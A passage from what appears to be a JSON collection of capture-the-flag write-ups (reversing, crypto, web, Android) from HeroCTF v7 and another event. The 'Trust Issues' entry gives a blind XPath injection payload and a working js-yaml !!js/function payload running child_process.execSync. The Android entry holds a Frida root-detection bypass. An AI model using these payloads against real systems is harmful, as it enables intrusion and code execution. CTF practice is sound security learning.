solve.py</code> produced:</p>\n<pre><code class=\"\">\nDecrypted string: b'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}'\n\n</code></pre>\n<h3>7. Verification</h3>\n<p>To verify the decrypted flag, the executable needed to be run with execute permissions. After restoring execute permissions:</p>\n<pre><code class=\"bash\">\nchmod +x challenge\n\necho 'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}' | ./challenge\n\n</code></pre>\n<p>Output:</p>\n<pre><code class=\"\">\nEnter the flag: Correct! You got the flag!\n\n</code></pre>\n<p>This confirmed the flag was correctly identified.</p>\n<h3>Flag</h3>\n<p><code>flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}</code></p>\n<pre><code class=\"\">\n</code></pre>"
            },
            {
                "id": "trust-issues",
                "title": "Trust Issues",
                "category": "Web Exploitation",
                "tags": [
                    "injection"
                ],
                "writeup": "<ol>\n<li><strong>Blind XPath Injection (Timing Attack):</strong></li>\n</ol>\n<p>The <code>login</code> endpoint was vulnerable to XPath injection via the <code>username</code> field. The application performed a <code>setTimeout(..., 2000)</code> if a user was found, creating a timing oracle. By injecting XPath queries, we could ask true/false questions about the database content based on the response time.</p>\n<ul>\n<li><strong>Vulnerable Code:</strong></li>\n</ul>\n<p>``<code>javascript         const query = </code>//user[username/text()='${username}']<code>;         const userNode = xpath.select(query, xmlDoc)[0];         if (userNode) { await new Promise(resolve =&gt; setTimeout(resolve, 2000)); }         </code>``</p>\n<ul>\n<li><strong>Exploit:</strong> We used a script to iterate through characters of the admin's password using the payload <code>admin' and substring(password, N, 1)='C</code>. This allowed us to extract the admin password: <code>df08cf</code>.</li>\n</ul>\n<ol>\n<li><strong>Remote Code Execution (RCE) via YAML Deserialization:</strong></li>\n</ol>\n<p>With the admin credentials, we accessed the <code>/admin/create</code> endpoint. This endpoint accepted YAML content and parsed it using an outdated and vulnerable version of <code>js-yaml</code> (v2.0.4).</p>\n<ul>\n<li><strong>Vulnerable Code:</strong></li>\n</ul>\n<p>``<code>javascript         parsed = yaml.load(fileContent);         const applied = '' + parsed;          </code>``</p>\n<ul>\n<li><strong>Exploit:</strong> We constructed a malicious YAML payload using the <code>!!js/function</code> tag, which allows execution of arbitrary JavaScript code during parsing in this version of <code>js-yaml</code>. We used an IIFE (Immediately Invoked Function Expression) to run system commands. Since <code>require</code> is not available in the global scope of <code>new Function</code>, we accessed it via <code>process.mainModule.require</code>.</li>\n</ul>\n<p><strong>Payload:</strong>     ``<code>yaml     !!js/function \"function() { var req = process.mainModule.require; var res = req('child_process').execSync('cat flag.txt').toString(); return res; }()\"     </code>``</p>\n<p><strong>Flag:</strong> <code>flag{xPath_to_YamLrc3_ecddd907d5d5decb}</code></p>"
            },
            {
                "id": "vault",
                "title": "Vault",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p>The challenge presented a stripped 64-bit ELF executable named <code>chal</code>. Upon execution, it prompted for a password:</p>\n<pre><code class=\"\">\nI heard that you got some crazy vault breaking skills\n\n\n\nTry to break this one\n\n\n\nEnter the password:\n\n</code></pre>\n<p>Initial attempts with arbitrary input resulted in:</p>\n<pre><code class=\"\">\nL00ks like you got some real skill issue.\n\nBetter luck next time.\n\n</code></pre>\n<p>Analysis using <code>objdump -d chal</code> and <code>readelf -S chal</code> revealed the following:</p>\n<ol>\n<li><strong>Password Length:</strong> The <code>main</code> function (at <code>0x1460</code>) used <code>scanf</code> to read input and then checked its length using <code>strcspn</code>. It compared the length against <code>0x35</code> (decimal 53). If the length was not 53, it printed the \"skill issue\" message and exited. This established the password length as 53 characters.</li>\n</ol>\n<ol>\n<li><strong>Dynamic Code Generation (JIT):</strong></li>\n</ol>\n<p>The core validation logic was found in a function called by <code>main</code> (at <code>0x1379</code>). This function iterated 53 times (once for each character of the password). In each iteration, it performed the following:</p>\n<ul>\n<li>It called another function (at <code>0x1249</code>) to dynamically generate a small piece of executable code (shellcode).</li>\n<li>This dynamically generated shellcode was then executed to validate the current character of the password.</li>\n<li>The address of the generated shellcode (in a memory-mapped executable region) was passed via <code>%r9</code>.</li>\n</ul>\n<ol>\n<li><strong>Shellcode Generation Logic (Function at <code>0x1249</code>):</strong></li>\n</ol>\n<p>This function was responsible for \"decrypting\" the validation logic for each password character.</p>\n<ul>\n<li>It allocated a 56-byte executable memory region using <code>mmap</code>.</li>\n<li>It iterated 56 times, reading an encrypted byte <code>B</code> from a <code>data</code> section (<code>0x4020 + 57 * i + j</code>).</li>\n<li>It XORed <code>B</code> with a 4-byte key <code>K</code> (read from <code>0x4c00 + i * 4</code>). Specifically, it used the lowest byte of the XOR operation <code>(B ^ K) &amp; 0xFF</code> to reconstruct the shellcode byte. This means <code>K</code> was effectively used as a single-byte XOR key for decryption, repeating for each byte of the shellcode.</li>\n<li>The decrypted bytes formed the actual machine code for the character's validation function.</li>\n</ul>\n<ol>\n<li><strong>Shellcode Validation Logic:</strong></li>\n</ol>\n<p>Disassembly of the generated shellcode (e.g., <code>func_0.bin</code>) revealed a consistent structure:</p>\n<ul>\n<li><code>mov $SHIFT, %ecx</code>: The first instruction loaded a varying <code>SHIFT</code> value into <code>%ecx</code>. This <code>SHIFT</code> determined the starting bit position for validation.</li>\n<li><code>xor %rsi, %rdi</code>: The input character (<code>%rdi</code>) was XORed with the full 4-byte key (<code>%rsi</code>, passed from the main loop, which was <code>K</code>). Let <code>Y = input_char ^ K</code>.</li>\n<li>A loop then iterated 8 times (for bits 0-7). In each iteration <code>k</code> (0 to 7):</li>\n<li>It extracted a specific bit from <code>Y</code>: <code>bit = (Y &gt;&gt; ((SHIFT + k) % 8)) &amp; 1</code>.</li>\n<li>This <code>bit</code> was compared against an <code>expected_bit</code> value. The <code>expected_bit</code> was read from a <code>bits</code> section (<code>0x4ce0 + i * 32 + k * 4</code>).</li>\n<li>If all 8 bits matched, the shellcode returned 1 (success); otherwise, it returned 0 (failure).</li>\n</ul>\n<ol>\n<li><strong>Reconstruction Algorithm:</strong></li>\n</ol>\n<p>To find the password, for each character <code>i</code> from 0 to 52:</p>\n<ul>\n<li><strong>Get Key:</strong> Read the 4-byte key <code>K</code> from <code>0x4c00 + i * 4</code>.</li>\n<li><strong>Get Shift:</strong> Decrypt the first two bytes of the <code>i</code>-th shellcode. The second byte <code>b1</code> of the decrypted code (<code>data[0x3020 + 57*i + 1] ^ (K &amp; 0xFF)</code>) yielded the <code>SHIFT</code> value.</li>\n<li><strong>Reconstruct Y:</strong> Initialize <code>Y = 0</code>. For <code>k</code> from 0 to 7:</li>\n<li>Read <code>expected_bit</code> from <code>0x4ce0 + i * 32 + k * 4</code>.</li>\n<li>Calculate the bit position: <code>bit_pos = (SHIFT + k) % 8</code>.</li>\n<li>If <code>expected_bit</code> is 1, set the <code>bit_pos</code> bit in <code>Y</code>.</li>\n<li><strong>Derive Character:</strong> Since <code>Y = input_char ^ K</code>, then <code>input_char = Y ^ K</code>. As only the lower 8 bits were relevant (<code>Y</code> was an 8-bit value), the actual character was <code>chr(Y ^ (K &amp; 0xFF))</code>.</li>\n</ul>\n<p>The Python script <code>solve_final_v2.py</code> implemented this logic.</p>\n<p><strong>Python Script (<code>solve_final_v2.py</code>):</strong></p>\n<pre><code class=\"python\">\nimport struct\n\n\n\ndef solve():\n\n    with open('chal', 'rb') as f:\n\n        data = f.read()\n\n\n\n    # Offsets (determined from readelf -S chal)\n\n    # 0x4020 (data_section_offset) is relative to its containing .data section (0x3000 file offset)\n\n    # 0x4c00 (key_section_address) -&gt; 0x3c00 (file offset)\n\n    # 0x4ce0 (bits_section_address) -&gt; 0x3ce0 (file offset)\n\n    data_section_offset = 0x3020\n\n    key_section_offset = 0x3c00\n\n    bits_section_offset = 0x3ce0\n\n\n\n    password = []\n\n\n\n    for i in range(53):\n\n        # 1. Read Key (used as XOR key in the check function)\n\n        key_offset = key_section_offset + (i * 4)\n\n        key_bytes = data[key_offset:key_offset+4]\n\n        key = struct.unpack('&lt;I', key_bytes)[0] # Keys are 4-byte little endian integers\n\n        \n\n        # 2. Decrypt the first two bytes of the shellcode to find 'start_shift'\n\n        # The instruction is 'b9 SHIFT 00 00 00' (mov $SHIFT, %ecx)\n\n        # Encrypted byte 0: data[data_section_offset + 57*i + 0]\n\n        # Encrypted byte 1: data[data_section_offset + 57*i + 1]\n\n        \n\n        enc_b0 = data[data_section_offset + 57*i + 0]\n\n        enc_b1 = data[data_section_offset + 57*i + 1]\n\n        \n\n        dec_b0 = enc_b0 ^ (key &amp; 0xFF) # The lowest byte of the key is used for shellcode decryption\n\n        dec_b1 = enc_b1 ^ (key &amp; 0xFF)\n\n        \n\n        if dec_b0 != 0xB9:\n\n            print(f\"Error: Func {i} does not start with 0xB9 (mov %ecx). Found {hex(dec_b0)}\")\n\n            # Fallback to default if there's an unexpected format, though this indicates an issue.\n\n            start_shift = 4 \n\n        else:\n\n            start_shift = dec_b1\n\n            \n\n        # 3. Reconstruct Y = char ^ K (where K is the actual 4-byte key)\n\n        # The character's bits are checked in the order: (start_shift + k) % 8 for k = 0 to 7.\n\n        \n\n        Y = 0 # This will hold the 8-bit value of (char ^ K)\n\n        base_bits_offset = bits_section_offset + (i * 32)\n\n        \n\n        for k in range(8):\n\n            # The expected bit is stored as a single byte at base_bits_offset + (k * 4)\n\n            expected_bit_offset = base_bits_offset + (k * 4)\n\n            expected_bit = data[expected_bit_offset] # Read byte\n\n            \n\n            # The bit position in Y being checked in this iteration\n\n            bit_pos = (start_shift + k) % 8\n\n            \n\n            if expected_bit: # If the expected bit is 1\n\n                Y |= (1 &lt;&lt; bit_pos) # Set that bit in Y\n\n        \n\n        # 4. Derive the actual character\n\n        # We have Y = input_char ^ K. Therefore, input_char = Y ^ K.\n\n        # Since Y is an 8-bit value, we only care about the lowest 8 bits of K.\n\n        char_code = Y ^ (key &amp; 0xFF)\n\n        password.append(chr(char_code))\n\n\n\n    print(\"Password:\", \"\".join(password))\n\n\n\nif __name__ == '__main__':\n\n    solve()\n\n</code></pre>\n<p><strong>Execution:</strong> Running the script yielded the password: <code>flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}</code></p>\n<p>Verification with <code>./chal</code> confirmed the flag: <code>echo \"flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}\" | ./chal</code> Output: <code>Good job</code></p>"
            },
            {
                "id": "where-code",
                "title": "Where code",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<ol>\n<li>Initial Analysis</li>\n</ol>\n<p>We started with a 64-bit ELF binary named challenge. Running strings on the binary revealed a critical clue: Plaintext</p>\n<p>expand 32-byte k</p>\n<p>This string is the distinct sigma constant used in ChaCha20 and Salsa20 stream ciphers. This immediately suggests that the flag is being encrypted or decrypted using one of these algorithms.</p>\n<ol>\n<li>Static Analysis (Decompilation)</li>\n</ol>\n<p>Opening the binary in a decompiler (like Ghidra) revealed a main function calling a subroutine FUN_00101592. Analyzing this subroutine confirmed the encryption logic. The Encryption Routine</p>\n<p>The function initializes a state matrix using the constants found earlier:</p>\n<p>0x61707865 (\"apxe\")</p>\n<p>0x3320646e (\"3 dn\")</p>\n<p>0x79622d32 (\"yb-2\")</p>\n<p>0x6b206574 (\"k et\")</p>\n<p>Reversed (Little Endian), this spells \"expand 32-byte k\". The code then performs an XOR operation on the input buffer, confirming it is a stream cipher. Identifying the Secrets</p>\n<p>To decrypt the flag, we needed three components: the Key, the Nonce (IV), and the Ciphertext. By analyzing the memory addresses in the decompiled code, we mapped the virtual addresses to file offsets:</p>\n<p>The Key (32 bytes):</p>\n<p>Location: 0x2080</p>\n<p>Value: A sequential pattern 00 01 02 ... 1F.</p>\n<p>The Nonce (12 bytes):</p>\n<p>Location: 0x20A0</p>\n<p>Value: Mostly nulls with 4A in the middle (000000000000004a00000000).</p>\n<p>The Ciphertext:</p>\n<p>Location: 0x2040</p>\n<p>Analysis: The main function passed a pointer to this address as the first argument to the encryption function. It contained roughly 34 bytes of raw binary data.</p>\n<ol>\n<li>The Problem</li>\n</ol>\n<p>Attempting to debug with GDB was inconsistent. Additionally, standard Python libraries (PyCryptodome) sometimes handle the ChaCha20 block counter differently (starting at 0 vs 1). The binary explicitly initialized the block counter to 1.</p>\n<ol>\n<li>The Solution</li>\n</ol>\n<p>We wrote a Python script to manually implement the ChaCha20 block function. This allowed us to:</p>\n<p>Extract the Key, Nonce, and Ciphertext directly from the binary file using the offsets found in Step 2.</p>\n<p>Force the block counter to start at 1 to match the binary's behavior.</p>\n<p>XOR the generated keystream with the ciphertext.</p>\n<p>Solver Script</p>\n<pre><code class=\"python\">\nimport struct\n\n\n\ndef rotl32(x, n):\n\n    return ((x &lt;&lt; n) &amp; 0xffffffff) | (x &gt;&gt; (32 - n))\n\n\n\ndef chacha20_block(key, counter, nonce):\n\n    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]\n\n    k = list(struct.unpack('&lt;8I', key))\n\n    n = list(struct.unpack('&lt;3I', nonce))\n\n    state = constants + k + [counter] + n\n\n    working_state = list(state)\n\n    \n\n    # 20 rounds (Standard ChaCha20)\n\n    for _ in range(10): \n\n        def qr(a, b, c, d):\n\n            a = (a + b) &amp; 0xffffffff; d ^= a; d = rotl32(d, 16)\n\n            c = (c + d) &amp; 0xffffffff; b ^= c; b = rotl32(b, 12)\n\n            a = (a + b) &amp; 0xffffffff; d ^= a; d = rotl32(d, 8)\n\n            c = (c + d) &amp; 0xffffffff; b ^= c; b = rotl32(b, 7)\n\n            return a, b, c, d\n\n        \n\n        # Column &amp; Diagonal rounds\n\n        working_state[0], working_state[4], working_state[8], working_state[12] = qr(working_state[0], working_state[4], working_state[8], working_state[12])\n\n        working_state[1], working_state[5], working_state[9], working_state[13] = qr(working_state[1], working_state[5], working_state[9], working_state[13])\n\n        working_state[2], working_state[6], working_state[10], working_state[14] = qr(working_state[2], working_state[6], working_state[10], working_state[14])\n\n        working_state[3], working_state[7], working_state[11], working_state[15] = qr(working_state[3], working_state[7], working_state[11], working_state[15])\n\n        working_state[0], working_state[5], working_state[10], working_state[15] = qr(working_state[0], working_state[5], working_state[10], working_state[15])\n\n        working_state[1], working_state[6], working_state[11], working_state[12] = qr(working_state[1], working_state[6], working_state[11], working_state[12])\n\n        working_state[2], working_state[7], working_state[8], working_state[13] = qr(working_state[2], working_state[7], working_state[8], working_state[13])\n\n        working_state[3], working_state[4], working_state[9], working_state[14] = qr(working_state[3], working_state[4], working_state[9], working_state[14])\n\n\n\n    return b''.join(struct.pack('&lt;I', (working_state[i] + state[i]) &amp; 0xffffffff) for i in range(16))\n\n\n\nwith open(\"challenge\", \"rb\") as f:\n\n    data = f.read()\n\n    key = data[0x2080:0x20a0]\n\n    nonce = data[0x20a0:0x20ac]\n\n    cipher = data[0x2040:0x2062]\n\n    \n\n    keystream = chacha20_block(key, 1, nonce)\n\n    print(bytes(a ^ b for a, b in zip(cipher, keystream)).decode())\n\n</code></pre>\n<ol>\n<li>The Flag</li>\n</ol>\n<p>Running the script produced the flag:</p>\n<p>flag{iN1_f!ni_Min1_m0...1_$e3_yOu}</p>"
            }
        ]
    },
    "HeroCTF v7": {
        "rank": "111th place",
        "description": "Competed in various challenge categories including web exploitation, cryptography, and reverse engineering.",
        "challenges": [
            {
                "id": "andor",
                "title": "Andor",
                "category": "Cryptography",
                "tags": [
                    "crypto"
                ],
                "writeup": "<h3>\ud83d\udd0d Analysis</h3>\n<p>The flag is split into two halves:</p>\n<p>|Half|Operation|Output| |---|---|---| |First half|<code>flag &amp; random</code>|printed as <code>a</code>| |Second half|<code>flag|random</code>|</p>\n<p>Each round uses a <strong>new random key</strong>, but the flag is static.</p>\n<p>---</p>\n<h3>\ud83e\udde0 Vulnerability</h3>\n<h4>\ud83d\udd39 First half (AND leak)</h4>\n<p>For each bit:</p>\n<p><code>flag_bit AND random_bit</code></p>\n<p>|Flag bit|Result| |---|---| |0|always 0| |1|sometimes 1|</p>\n<p>\ud83d\udc49 If we OR together results over many rounds, we recover all bits that ever become 1 \u2192 this reconstructs the first half.</p>\n<p>---</p>\n<h4>\ud83d\udd39 Second half (OR leak)</h4>\n<p>For each bit:</p>\n<p><code>flag_bit OR random_bit</code></p>\n<p>|Flag bit|Result| |---|---| |1|always 1| |0|sometimes 0|</p>\n<p>\ud83d\udc49 If we AND together results over many rounds, only constant 1 bits survive \u2192 this reconstructs the second half.</p>\n<p>---</p>\n<h3>\u2694\ufe0f Attack Strategy</h3>\n<p>Repeat the connection many times.</p>\n<ul>\n<li>OR all AND outputs \u2192 reveals first half</li>\n</ul>\n<ul>\n<li>AND all OR outputs \u2192 reveals second half</li>\n</ul>\n<p>This cancels randomness and leaks the full flag.</p>\n<p>---</p>\n<h3>\ud83e\uddd1\u200d\ud83d\udcbb Exploit Script</h3>\n<h4>Python solution:</h4>\n<pre><code class=\"\">\nimport socket\n\n\n\nHOST = \"crypto.heroctf.fr\"\n\nPORT = 9000\n\nROUNDS = 300\n\n\n\nand_acc = None\n\nor_acc = None\n\n\n\nfor i in range(ROUNDS):\n\n    s = socket.create_connection((HOST, PORT))\n\n    data = s.recv(4096).decode().splitlines()\n\n    s.close()\n\n\n\n    a = bytes.fromhex(data[0].split(\"=\")[1].strip())\n\n    o = bytes.fromhex(data[1].split(\"=\")[1].strip())\n\n\n\n    if and_acc is None:\n\n        and_acc = list(a)\n\n        or_acc = list(o)\n\n    else:\n\n        and_acc = [x | y for x, y in zip(and_acc, a)]\n\n        or_acc = [x &amp; y for x, y in zip(or_acc, o)]\n\n\n\n    if i % 25 == 0:\n\n        print(f\"[+] Iteration {i}\")\n\n\n\nflag = bytes(and_acc + or_acc)\n\nprint(\"FLAG:\", flag.decode())\n\n</code></pre>\n<p>---</p>\n<h3>\u2705 Result</h3>\n<p>After ~200\u2013300 rounds:</p>\n<p><code>Hero{y0u_4nd_5l33p_0r_y0u_4nd_c0ff33_3qu4l5_fl4g_4nd_p01n75}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "apprentice-of-the-ir-forge",
                "title": "Apprentice of the IR Forge",
                "category": "Reverse Engineering",
                "tags": [
                    "pwn",
                    "reverse",
                    "assembly"
                ],
                "writeup": "<h3>Challenge Goal</h3>\n<p>The objective of this challenge was to obtain the flag by interacting with a remote service that compiled user-provided C code using a custom LLVM pass.</p>\n<h3>Initial Reconnaissance</h3>\n<p>The provided files included:</p>\n<ul>\n<li><code>Dockerfile</code>: Indicated an Arch Linux environment with clang and llvm.</li>\n<li><code>flag.txt</code>: A placeholder file (<code>Hero{FAKE_FLAG}</code>).</li>\n<li><code>Makefile</code>: Showed that <code>src/valid_pass.c</code> is compiled with <code>clang</code> and a custom LLVM pass (<code>bin/apprentice_of_the_IR_forge.so</code>).</li>\n<li><code>solve_template.py</code>: A Python script using <code>pwntools</code> to connect to a remote server, read <code>src/valid_pass.c</code>, and send its content for compilation.</li>\n<li><code>bin/apprentice_of_the_IR_forge.so</code>: The custom LLVM pass, which was the core of the challenge.</li>\n<li><code>src/valid_pass.c</code>: An initial empty C file.</li>\n</ul>\n<h3>LLVM Pass Analysis (<code>apprentice_of_the_IR_forge.so</code>)</h3>\n<p>Since the challenge involved a custom LLVM pass, the primary task was to understand its behavior. The <code>Makefile</code> revealed that the pass was loaded via <code>-fpass-plugin=bin/apprentice_of_the_IR_forge.so</code> during compilation.</p>\n<ol>\n<li><strong>String Analysis</strong>:</li>\n</ol>\n<p>I started by extracting human-readable strings from <code>bin/apprentice_of_the_IR_forge.so</code> using the <code>strings</code> command. This quickly revealed several key phrases:</p>\n<ul>\n<li><code>SWORD_OF_THE_HERO</code></li>\n<li><code>[+] Good job here is your flag:</code></li>\n<li><code>[-] Call an admin it shouldn't be the case</code></li>\n<li><code>flag.txt</code></li>\n<li><code>[-] Nope</code></li>\n</ul>\n<p>This suggested that the pass looked for a specific symbol or condition related to <code>SWORD_OF_THE_HERO</code> and, upon success, would read <code>flag.txt</code> and print its content.</p>\n<ol>\n<li><strong>Disassembly and Logic Flow</strong>:</li>\n</ol>\n<p>To understand the exact conditions, I disassembled the <code>.so</code> file using <code>objdump -d</code>. I searched for references to the \"Good job\" string (<code>0x14375</code> in the <code>.rodata</code> section) to locate the success path in the code. The relevant function was identified as part of <code>hero::custom_pass::run</code>.</p>\n<p>The disassembled code revealed the following checks performed by the LLVM pass:</p>\n<ul>\n<li><strong>Function Name Check</strong>: It compared the name of a function in the compiled module against the string <code>SWORD_OF_THE_HERO</code>. This was identified by a call to <code>llvm::StringRef::operator==</code> (<code>_ZN4llvmeqENS_9StringRefES0_@plt</code>).</li>\n<li><strong>Argument Count and Type Check</strong>: It iterated through the arguments of the <code>SWORD_OF_THE_HERO</code> function. It specifically checked for 3 arguments. For each argument, it retrieved its LLVM <code>TypeID</code> and compared it to <code>0xc</code> (12). This indicated a requirement for three arguments of a specific type.</li>\n<li><strong>Return Type Check</strong>: It retrieved the <code>TypeID</code> of the function's return type and compared it to <code>0xe</code> (14).</li>\n</ul>\n<p><strong>Deducing LLVM TypeIDs</strong>:     Through online research and common LLVM enum values (considering the likely recent Arch Linux LLVM version indicated by the <code>Dockerfile</code>), <code>TypeID 12</code> corresponds to <strong>IntegerTyID</strong>, and <code>TypeID 14</code> corresponds to <strong>PointerTyID</strong>. This implied the required function signature would involve integer arguments and a pointer return type.</p>\n<p><strong>Flag Retrieval Logic</strong>:     The code path leading to the \"Good job\" message also showed calls related to file operations, specifically referencing <code>flag.txt</code> (<code>0x1433f</code> in <code>.rodata</code>). If all conditions were met, the pass would open <code>flag.txt</code>, read its content, and print it alongside the success message. If any condition failed, it would print the \"Nope\" or \"Call an admin\" messages.</p>\n<h3>Solution Implementation</h3>\n<p>Based on the analysis, the <code>src/valid_pass.c</code> file needed to define a function named <code>SWORD_OF_THE_HERO</code> with three integer arguments and a pointer return type. A <code>void*</code> return type was chosen as a generic pointer.</p>\n<p>The <code>src/valid_pass.c</code> was modified as follows:</p>\n<pre><code class=\"c\">\n#include &lt;stdlib.h&gt;\n\n\n\n// The LLVM pass checks for a function named \"SWORD_OF_THE_HERO\"\n\n// It requires 3 arguments of TypeID 12 (Integer)\n\n// It requires a return type of TypeID 14 (Pointer)\n\n\n\nint* SWORD_OF_THE_HERO(int a, int b, int c) {\n\n    return NULL;\n\n}\n\n\n\nint main() {\n\n    return 0;\n\n}\n\n</code></pre>\n<h3>Remote Interaction</h3>\n<p>The <code>solve_template.py</code> script was adapted to <code>solve.py</code> with the provided remote server details:</p>\n<ul>\n<li><code>HOST = \"reverse.heroctf.fr\"</code></li>\n<li><code>PORT = 7002</code></li>\n</ul>\n<p>This script then sent the crafted <code>src/valid_pass.c</code> to the remote server.</p>\n<h3>Flag</h3>\n<p>Upon executing <code>solve.py</code>, the remote server compiled the code with the custom LLVM pass. The conditions were met, and the flag was successfully retrieved:</p>\n<p><code>Hero{Yu0_f0rG3d_y0uR_oWn_p47H_4pPr3nT1cE}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "freeda-not-root",
                "title": "Freeda-Not-Root",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "http",
                    "patch",
                    "image"
                ],
                "writeup": "<p>android</p>\n<h3>Challenge Description</h3>\n<p>An Android APK with root detection that requires finding a password to access a vault. The challenge hints at using Frida (the name \"freeda2\" is a play on \"Frida\").</p>\n<h3>Initial Analysis</h3>\n<h4>1. APK Installation & Basic Recon</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\n# Install the APK\n\nadb install app-release.apk\n\n\n\n# Check package name\n\naapt dump badging app-release.apk | grep package\n\n# Output: package:com.heroctf.freeda2\n\n</code></pre>\n<h4>2. Decompile the APK</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\n# Decompile with apktool\n\napktool d app-release.apk -o decompiled/\n\n</code></pre>\n<h4>3. Static Analysis</h4>\n<p>Examining the decompiled smali code reveals:</p>\n<p><strong>MainActivity.smali</strong>: The main UI with a password input field and submit button.</p>\n<p><strong>CheckFlag.smali</strong>: Contains the password validation logic:</p>\n<p>java</p>\n<pre><code class=\"java\">\npublic static checkFlag(String input) {\n\n    // Uses reflection to call Vault.get_flag()\n\n    // Compares input with the result\n\n}\n\n</code></pre>\n<p><strong>Vault.smali</strong>: Contains an obfuscated <code>get_flag()</code> method that:</p>\n<ul>\n<li>Uses encrypted Base64 data: <code>fH6Da4rCaxDW/lvs32vwcvJcmy9TgPQaLHfJuw==</code></li>\n<li>Decryption key: <code>0x5f9d7bc3</code></li>\n<li>Complex decryption involving:</li>\n<li>Permutation arrays</li>\n<li>Bit rotation</li>\n<li>XOR operations</li>\n<li>Custom PRNG (method X)</li>\n</ul>\n<p><strong>Security.smali</strong>: Root detection using RootBeer library:</p>\n<p>java</p>\n<pre><code class=\"java\">\npublic static detectRoot(Context context) {\n\n    return new RootBeer(context).isRooted();\n\n}\n\n</code></pre>\n<h3>Solution Approach</h3>\n<h4>Attempt 1: Manual Decryption (Failed)</h4>\n<p>Tried to manually implement the decryption algorithm by analyzing methods K(), E(), P(), B(), X(), and I(). The algorithm was too complex with multiple layers of obfuscation.</p>\n<h4>Attempt 2: APK Patching (Failed)</h4>\n<p>Attempted to:</p>\n<ul>\n<li>Add logging code to print the flag on app startup</li>\n<li>Modify the CheckFlag to always return true</li>\n<li>Repackage and sign the APK</li>\n</ul>\n<p>Issues encountered:</p>\n<ul>\n<li>Native library extraction failures</li>\n<li>APK signature verification problems</li>\n</ul>\n<h4>Attempt 3: Frida on Production Build (Failed)</h4>\n<p>Initial attempts to use Frida failed because:</p>\n<ul>\n<li>The default emulator was a production build</li>\n<li><code>adb root</code> returned: \"adbd cannot run as root in production builds\"</li>\n<li>Frida requires root access to hook system processes</li>\n</ul>\n<h4>Solution: Frida with Rooted Emulator \u2705</h4>\n<h3>Step-by-Step Solution</h3>\n<h4>1. Create a Rootable Android Emulator</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\n# Set up SDK paths\n\nexport ANDROID_HOME=$HOME/Android/Sdk\n\nexport ANDROID_SDK_ROOT=$HOME/Android/Sdk\n\n\n\n# Download a rootable system image (default, not google_apis_playstore)\n\nsdkmanager --install \"system-images;android-34;default;x86_64\"\n\n\n\n# Create AVD\n\navdmanager create avd -n rootable_emu \\\n\n    -k \"system-images;android-34;default;x86_64\" \\\n\n    -d pixel_5 --force\n\n\n\n# Start emulator\n\nexport QT_QPA_PLATFORM=xcb\n\nemulator -avd rootable_emu &amp;\n\n</code></pre>\n<h4>2. Root the Emulator</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\n# Wait for boot\n\nadb wait-for-device\n\nsleep 30\n\n\n\n# Get root access\n\nadb root\n\n\n\n# Verify root\n\nadb shell id\n\n# Output: uid=0(root) gid=0(root) ...\n\n</code></pre>\n<h4>3. Install Frida Server</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\n# Download frida-server\n\nwget https://github.com/frida/frida/releases/download/17.5.1/frida-server-17.5.1-android-x86_64.xz\n\nunxz frida-server-17.5.1-android-x86_64.xz\n\n\n\n# Push to device\n\nadb push frida-server-17.5.1-android-x86_64 /data/local/tmp/frida-server\n\nadb shell \"chmod 755 /data/local/tmp/frida-server\"\n\n\n\n# Start frida-server\n\nadb shell \"nohup /data/local/tmp/frida-server &gt; /dev/null 2&gt;&amp;1 &amp;\"\n\n</code></pre>\n<h4>4. Install the Target App</h4>\n<p>bash</p>\n<pre><code class=\"bash\">\nadb install app-release.apk\n\n</code></pre>\n<h4>5. Create Frida Bypass Script</h4>\n<p>Create <code>bypass_root.js</code>:</p>\n<p>javascript</p>\n<pre><code class=\"javascript\">\nJava.perform(function() {\n\n    console.log(\"[*] Bypassing root detection...\");\n\n    \n\n    // Bypass Security.detectRoot\n\n    var Security = Java.use(\"com.heroctf.freeda2.utils.Security\");\n\n    Security.detectRoot.implementation = function(context) {\n\n        console.log(\"[*] Root detection bypassed!\");\n\n        return false;  // Always return not rooted\n\n    };\n\n    \n\n    // Bypass RootBeer directly\n\n    try {\n\n        var RootBeer = Java.use(\"com.scottyab.rootbeer.RootBeer\");\n\n        RootBeer.isRooted.implementation = function() {\n\n            return false;\n\n        };\n\n    } catch(e) {}\n\n    \n\n    // Hook CheckFlag to extract the password\n\n    var CheckFlag = Java.use(\"com.heroctf.freeda2.utils.CheckFlag\");\n\n    CheckFlag.checkFlag.implementation = function(input) {\n\n        console.log(\"[*] Input password: \" + input);\n\n        \n\n        // Call Vault.get_flag() to get the actual password\n\n        var Vault = Java.use(\"com.heroctf.freeda2.utils.Vault\");\n\n        var correctPassword = Vault.get_flag();\n\n        \n\n        console.log(\"========================================\");\n\n        console.log(\"[+] FLAG: \" + correctPassword);\n\n        console.log(\"========================================\");\n\n        \n\n        return this.checkFlag(input);\n\n    };\n\n    \n\n    console.log(\"[*] All hooks installed!\");\n\n});\n\n</code></pre>\n<h4>6. Run Frida and Get the Flag</h4>\n<p>bash</p>\n<pre><code class=\"`bash\">\n# Spawn the app with Frida hooks\n\nfrida -U -f com.heroctf.freeda2 -l bypass_root.js\n\n</code></pre>\n<p>In the app, enter any password (e.g., \"test\") and click submit.</p>\n<p><strong>Output:</strong></p>\n<pre><code class=\"\">\n[*] Bypassing root detection...\n\n[*] Root detection bypassed!\n\n[*] All hooks installed!\n\n[*] Input password: test\n\n========================================\n\n[+] FLAG: 